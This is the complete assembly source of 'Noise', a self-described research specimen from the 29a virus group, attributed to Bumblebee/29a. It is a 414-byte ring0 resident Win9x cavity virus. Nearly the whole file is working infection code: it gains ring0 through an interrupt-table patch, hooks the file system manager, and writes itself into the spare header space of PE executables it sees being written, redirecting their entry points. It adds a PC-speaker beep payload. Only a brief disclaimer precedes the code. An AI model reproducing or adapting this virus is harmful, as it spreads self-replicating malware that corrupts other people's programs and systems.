
;
;                                                  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;                                                  ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;     Noise                                         ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;     Coded by Bumblebee/29a                       ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;                                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Words from the author ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;   . I started to code an  i-worm  and i wanted  to make something like a
;   ring0 stealth routine for it. Then i realized: i did a ring0 virus heh
;   The name is  due the little  payload it has... that does  realy noise!
;   That's my first ring0 virus. I don't like codin ring0, but here it is.
;   That's a  research  spezimen. Don't expect the ultimate ring0 virus...
;   Only 414 bytes, that's less than MiniR3 (aka Win95.Rinim).
;
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Disclaimer ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
;   . This is the source  code of a VIRUS. The author  is not responsabile
;   of any  damage that  may occur  due to the assembly of this file.  Use
;   it at your own risk.
;
;   ÚÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Features ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÙ
;   . Ring0 resident win9x virus (thus coz the way it uses to get ring0 is
;   only for win9x, not nt not w2k).
;   . It infect in similar  way  like MiniR3 does. Uses free  space in the
;   PE header. That's a cavity virus.
;   . All the data is INSIDE the code. Well... copyright is not inside :)
;   . It infects PE  files in  the user buffer when a write  call is done.
;   That makes this virus not very efficient spreading.
;   . It has a kewl  sound  payload. Makes echo with  internal speaker for
;   all disk operations ;)
;
;   Greetz to Perikles for his tests ;) You're my best tester, you know...
;
;
;                                                       The way of the bee
;
.486p
locals
.model flat,STDCALL

        extrn           ExitProcess:PROC

VxDCall macro   vxd,service
        db      0cdh,20h
        dw      service
        dw      vxd
endm

IFSMANAGER      equ     40h

GETHEAP         equ     0dh
IFSAPIHOOK      equ     67h

VSIZE           equ     vEnd-vBegin
VSIZEROUND      equ     ((VSIZE/1024)+1)*1024

.DATA
        ; dummy data
        db      'WARNING - This is a virus carrier - WARNING'

.CODE
inicio:
        mov     eax,VSIZE

vBegin  label   byte
        pushad
        mov     al,byte ptr [esp+23h]
        sub     esp,8
        mov     ebp,esp

        cmp     al,0bfh
        jne     NotWin9x

        sidt    qword ptr [ebp]
        mov     esi,dword ptr [ebp+2]
        add     esi,3*8
        push    esi
        mov     di,word ptr [esi+6]
        shl     edi,10h
        mov     di,word ptr [esi]
        push    edi
        call    @delta
@deltaoffset:
cpright db      'Bbbee/29a@Noise'
@delta:
        pop     eax
        sub     eax,(offset @deltaoffset-offset ring0CodeInstaller)
        mov     word ptr [esi],ax
        shr     eax,10h
        mov     word ptr [esi+6],ax
        int     3h

        pop     edi
        pop     esi
        mov     word ptr [esi],di
        shr     edi,10h
        mov     word ptr [esi+6],di

NotWin9x:
        add     esp,8
        popad

        push    offset fakeHost
hostEP  equ     $-4
        ret

ring0CodeInstaller:
        pushad

        mov     ebp,0bff70000h
        sub     ebp,dword ptr [ebp]
        jz      ReturnR3

        push    VSIZEROUND
        VxDCall IFSMANAGER,GETHEAP
        pop     edi
        or      eax,eax
        jz      ReturnR3

        mov     edi,eax
        call    @@delta
@@delta:
        pop     esi
        sub     esi,(offset @@delta-offset vBegin)
        mov     ecx,VSIZE
        rep     movsb

        mov     dword ptr [delta-vBegin+eax],eax

        push    eax
        add     eax,offset ring0Hook-offset vBegin
        push    eax
        VxDCall IFSMANAGER,IFSAPIHOOK
        pop     ebp
        pop     edx
        mov     dword ptr [edx+nextHookInChain-vBegin],eax

        mov     ebp,0bff70000h
        mov     dword ptr [ebp],ebp

ReturnR3:
        popad
        iretd

ring0Hook:
        pop     eax
        push    ebp
        mov     ebp,12345678h
delta   equ     $-4
        mov     dword ptr [returnAddr-vBegin+ebp],eax
        push    edx
        mov     edx,esp

        pushad
        pushfd

        mov     ecx,0ffh
counter equ     $-4
        dec     cl
        jz      beep

        mov     ecx,dword ptr [edx+0ch]
        dec     ecx
        jz      checkFile

exitHook:
        popfd
        popad
        pop     edx
        pop     ebp

        mov     eax,12345678h
nextHookInChain equ $-4
        call    dword ptr [eax]

        push    12345678h
returnAddr      equ $-4
        ret

checkFile:
        mov     esi,dword ptr [edx+1ch]

        mov     cx,word ptr [esi]
        cmp     ecx,VSIZEROUND
        jb      exitHook

        mov     edi,dword ptr [esi+14h]

        mov     ebx,edi
        cmp     word ptr [edi],'ZM'
        jne     exitHook
        cmp     ecx,dword ptr [edi+3ch]
        jb      exitHook
        add     edi,dword ptr [edi+3ch]
        cmp     word ptr [edi],'EP'
        jne     exitHook

        mov     edx,dword ptr [edi+16h]
        test    edx,2h
        jz      exitHook
        and     edx,2000h
        jnz     exitHook
        mov     dx,word ptr [edi+5ch]
        dec     edx
        jz      exitHook

        mov     esi,edi
        mov     eax,18h
        add     ax,word ptr [edi+14h]
        add     edi,eax

        movzx   ecx,word ptr [esi+06h]
        mov     ax,28h
        mul     cx
        add     edi,eax

        mov     ecx,VSIZE
        xor     eax,eax
        pushad
        rep     scasb
        popad
        jnz     exitHook

        add     dword ptr [esi+54h],ecx

        push    edi
        sub     edi,ebx
        xchg    edi,dword ptr [esi+28h]
        mov     eax,dword ptr [esi+34h]
        add     edi,eax
        mov     dword ptr [hostEP-vBegin+ebp],edi
        pop     edi

        mov     esi,ebp
        rep     movsb

        dec     byte ptr [counter-vBegin+ebp]

        jmp     exitHook

beep:
        dec     cl
        in      al,61h
        push    ax
        or      al,03h
        out     61h,al

        mov     al,0b6h
        out     43h,al
        mov     ax,987
        mov     si,ax
beep_loop:
        add     si,100h
        mov     ax,si
        out     42h,al
        xchg    al,ah
        out     42h,al
        loop    beep_loop

        pop     ax
        out     61h,al
        jmp     exitHook

vEnd    label   byte

fakeHost:
        push    0h
        call    ExitProcess
Ends
End     inicio
